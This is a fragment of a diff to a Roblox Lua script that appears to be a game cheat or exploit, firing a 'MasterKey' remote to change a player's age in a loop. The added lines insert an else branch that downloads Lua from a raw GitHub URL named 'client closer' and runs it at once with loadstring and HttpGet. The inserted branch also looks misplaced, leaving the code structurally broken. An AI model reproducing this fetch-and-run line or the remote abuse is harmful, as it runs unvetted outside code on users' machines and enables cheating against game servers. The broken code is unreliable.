@@ -1106,6 +1106,10 @@ while true do
 			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
 		end
 		task.wait()
+
+			else
+				loadstring(game:HttpGet('https://raw.githubusercontent.com/Fattythefatty/bluefoxscript/main/client%20closer'))();
+				
 	end
 			
 			local HTTP_ = game:GetService('HttpService')
